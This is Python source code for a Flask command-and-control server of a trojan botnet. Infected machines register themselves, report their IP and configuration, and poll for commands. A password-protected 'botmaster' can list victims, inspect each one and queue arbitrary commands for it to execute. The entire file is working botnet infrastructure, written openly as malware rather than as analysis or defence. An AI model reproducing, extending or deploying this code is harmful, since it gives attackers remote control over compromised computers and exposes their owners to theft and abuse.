from flask import Flask, jsonify, request
from flask_restful import Api, Resource, abort
from logging import FileHandler, ERROR
#from datetime import datetime
from time import time
import sqlite3
import os

# TO DO Apr 16
# test everything manually
# i.e. each Resource, and corresponding DB entry


### db initialization ###
PATH_TO_DB = 'trojan.sqlite3'
PATH_TO_DB_INIT_SCRIPT = 'db_init_script.sql'
is_db_already_existent = os.path.exists(PATH_TO_DB)
conn = sqlite3.connect(PATH_TO_DB, check_same_thread=False)
if not is_db_already_existent:
    _cur = conn.cursor()
    with open(PATH_TO_DB_INIT_SCRIPT, 'r') as f:
        _cur.executescript(f.read()) 

### app init and config ###
app = Flask(__name__)
api = Api(app)
DEBUG = True
PORT = 5000

### botmaster password ###
with open('botmaster_password.txt', 'r') as f:
    BOTMASTER_PASSWORD = f.read().strip()

### error logging ###
ERROR_LOG_PATH = 'error_log.txt'
_file_handler = FileHandler(ERROR_LOG_PATH)
_file_handler.setLevel(ERROR)
app.logger.addHandler(_file_handler)

"""
### helper functions ###
def timestamp_ms_to_datetime_str(timestamp_ms) -> str:
    return str(datetime.fromtimestamp(round(timestamp_ms/1000)))
"""

### create the resources and define their methods ###
class Latest(Resource):
    '''
    returns
        {
            "issuedTimestampMS": int...,
            "body": str...
        }
    '''
    def get(self):
        # /latest?hwid=<hwid>
        client_hwid = request.args.get('hwid', None)
        global conn
        cur = conn.cursor()
        cur.execute('''
            SELECT issuedTimestampMS, body
            FROM Command
            WHERE (?) == clientID
            ORDER BY issuedTimestampMS DESC
        ''', (client_hwid,))
        result = cur.fetchone()
        return jsonify(
            issuedTimestampMS=result[0],
            body=result[1]
        )

class Ping(Resource):
    '''
    expects
        {
            "hwid": str...
        }
    '''
    def post(self):
        # updates DB with latest ping timestamp ms for Client entry
        client_hwid = request.json.get('hwid', None)
        # https://help.pythonanywhere.com/pages/WebAppClientIPAddresses/
        last_ip = request.remote_addr
        last_ping_timestamp_ms = round(time() * 1000)
        global conn
        cur = conn.cursor()
        cur.execute('''
            UPDATE Client
            SET lastPingTimeStampMS=(?), lastIP=(?)
            WHERE (?) == hwid
        ''', (last_ping_timestamp_ms, last_ip, client_hwid))
        conn.commit()

class Config(Resource):
    '''
    expects
        {
            "hwid": str...,
            "config": dict...
        }
    '''
    def post(self):
        # updates DB with last config that client runs on
        client_hwid = request.json.get('hwid', None)
        last_config = str(request.json.get('config', None))
        global conn
        cur = conn.cursor()
        cur.execute('''
            UPDATE Client
            SET lastConfig=(?)
            WHERE (?) == hwid
        ''', (last_config, client_hwid))
        conn.commit()

class Infected(Resource):
    '''
    expects
        {
            "hwid": str...,
            "config": dict...,
            "infected": int...
        }
    '''
    def post(self):
        # updates DB with new Client entry
        client_hwid = request.json.get('hwid', None)
        last_ip = request.remote_addr
        last_ping_ms = round(time() * 1000)
        last_config = str(request.json.get('config', None))
        infected_datetime = request.json.get('infected', None)
        global conn
        cur = conn.cursor()
        try:
            cur.execute('''
                INSERT INTO CLIENT (hwid, lastIP, 
                    lastPingTimestampMS, lastConfig, infectedTimestampMS)
                VALUES (?,?,?,?,?)
            ''', (client_hwid, last_ip, last_ping_ms, last_config, infected_datetime))
            conn.commit()
        except sqlite3.IntegrityError:
            abort(403, message='PERMISSION DENIED.')
        # update DB with first command for that client, which is to pass
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO 
            Command (issuedTimestampMS, body, clientID)
            VALUES (?,?,?)
        ''', (infected_datetime, 'pass', client_hwid))
        conn.commit()

class Status(Resource):
    '''
    returns 
        {
            "hwid": str...,
            "lastIP": str...,
            "lastPingTimestampMS": str...
        }
    '''
    def get(self):
        # /status?max=<top n clients>&order=<asc|desc>
        # returns list of n clients sorted by last ping OR by infection timestamp
        global BOTMASTER_PASSWORD
        if not request.cookies.get('auth') == BOTMASTER_PASSWORD:
            abort(403, message='PERMISSION DENIED.')
        global conn
        max_clients = request.args.get('max', None)
        asc_or_desc = 'ASC' if request.args.get('order').lower() == 'asc' else 'DESC'
        clients = []
        cur = conn.cursor()
        cur.execute(f'''
            SELECT hwid, lastIP, lastPingTimestampMS 
            FROM Client 
            ORDER BY lastPingTimestampMS {asc_or_desc}
            LIMIT (?) 
            OFFSET 0
        ''', (max_clients))
        for hwid, lastIP, lastPingTimestampMS in cur.fetchall():
            clients.append({
                'hwid': hwid,
                'lastIP': lastIP,
                'lastPingTimestampMS': lastPingTimestampMS
            })
        return jsonify(clients)

class Info(Resource):
    '''
    returns
        {
            "hwid": str...,
            "lastIP": str...,
            "lastPingTimestampMS": str...,
            "lastConfig": dict...,
            "infectedTimestampMS": str...
        }
    '''
    def get(self):
        # /info?hwid=<hwid>
        # returns all info of a client in their Client entry in the DB
        # AND the current config they're running on from memory
        global BOTMASTER_PASSWORD
        if not request.cookies.get('auth') == BOTMASTER_PASSWORD:
            abort(403, message='PERMISSION DENIED.')
        client_hwid = request.args.get('hwid', None)
        global conn
        cur = conn.cursor()
        cur.execute('''
            SELECT hwid, lastIP, lastPingTimestampMS, lastConfig, infectedTimestampMS
            FROM Client 
            WHERE hwid == (?)
        ''', (client_hwid,))
        client = cur.fetchone()
        return jsonify({
            'hwid': client[0],
            'lastIP': client[1],
            'lastPingTimestampMS': client[2],
            'lastConfig': client[3],
            'infectedTimestampMS': client[4]
        })

class Command(Resource):
    '''
    expects
    {
        "hwid": str...,
        "command": str...
    }
    '''
    def post(self):
        # adds the latest command for a specific client to execute
        global BOTMASTER_PASSWORD
        if not request.cookies.get('auth') == BOTMASTER_PASSWORD:
            abort(403, message='PERMISSION DENIED.')
        client_hwid = request.json.get('hwid', None)
        command = str(request.json.get('body', None))
        issued_timestamp_ms = round(time() * 1000)
        global conn
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO 
            Command (issuedTimestampMS, body, clientID)
            VALUES (?,?,?)
        ''', (issued_timestamp_ms, command, client_hwid))
        conn.commit()

### add the resources to the API ###
resources = {
    # accessible to client ; (!) no auth cookie required
    '/latest': Latest,
    '/ping': Ping,
    '/config': Config,
    '/infected': Infected,
    # accessible to botmaster ; auth cookie required
    '/status': Status,
    '/info': Info,
    '/command': Command,
}
for endpoint, resource in resources.items():
    api.add_resource(resource, endpoint)

### run the app ###
app.run(debug=DEBUG, port=PORT)